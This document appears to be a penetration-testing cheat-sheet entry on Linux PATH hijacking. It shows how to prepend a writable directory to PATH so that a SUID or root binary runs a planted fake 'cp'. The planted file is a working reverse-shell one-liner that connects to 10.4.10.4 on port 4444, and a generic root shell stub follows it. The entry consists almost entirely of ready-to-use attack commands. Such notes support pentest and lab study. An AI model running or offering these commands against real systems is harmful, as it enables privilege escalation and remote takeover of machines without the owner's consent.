---
title: PATH Hijacking
category: privesc
subcategory: linux-privesc
os: linux
command: export PATH=/tmp:$PATH
tools: echo, export
---


When a SUID/root binary calls a sub-binary by name (e.g. `cp`), prepend a writable directory to PATH.

### Inspect and override PATH

```bash
echo $PATH
export PATH=/tmp:$PATH
echo $PATH
```

### Plant a malicious binary

```bash
echo 'bash -c "exec bash -i &>/dev/tcp/10.4.10.4/4444 <&1"' > /tmp/cp
chmod +x /tmp/cp
```

Then trigger the privileged binary that calls `cp`.

### Generic shell stub for path hijacking

```bash
#!/bin/bash
bash -i
```
